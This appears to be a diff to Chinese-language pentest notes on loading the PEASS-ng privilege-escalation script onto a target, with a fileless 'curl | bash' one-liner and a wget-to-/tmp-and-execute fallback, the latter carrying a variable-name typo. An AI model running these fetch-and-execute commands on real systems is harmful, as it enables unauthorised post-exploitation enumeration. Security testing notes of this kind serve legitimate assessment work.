@@ -1,7 +1,5 @@
 官方地址：https://github.com/peass-ng/PEASS-ng/releases/download/20260315-d7c1e6ce/
+>有curl的情况下，文件不落地
 curl $downloadurl | bash
+>没有curl就用wget下载到tmp目录在执行
 cd /tmp && wget $downloadurl && chmod +x $badfileh && ./$badfile
-
-###
-第一条命令适用于有curl的情况下，第二条命令适用于没有curl但有wget的情况下
-###
